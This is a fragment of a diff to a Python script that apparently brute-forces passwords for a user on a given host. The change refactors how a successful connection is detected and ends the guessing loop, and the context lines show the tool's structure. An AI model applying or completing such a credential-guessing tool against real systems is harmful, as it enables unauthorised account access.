@@ -8,7 +8,9 @@ if len([arg for arg in sys.argv]) != 5:
 host = sys.argv[1]
 user = sys.argv[2]
 fileName = sys.argv[3]
-timeOut = sys.argv[4]
+timeOut = sys.argv[4]\
+
+Connected = "Connected"
 
 def tryConnect(
         host:string,
@@ -23,7 +25,7 @@ def tryConnect(
             timeout=timeout)
         if response.connected():
             response.close()
-            return "Connected"
+            return Connected
     except Exception as exception:
         return str(exception)
 
@@ -49,12 +51,9 @@ def tryBruteForce(
                 user,
                 password,
                 timeOut)
-            match connection:
-                case "Connected":
-                    print(connection)
-                    break
-                case _:
-                    print(connection)
+            print (connection)
+            if connection == Connected:
+                break
     except Exception as exception:
         print(exception)
 
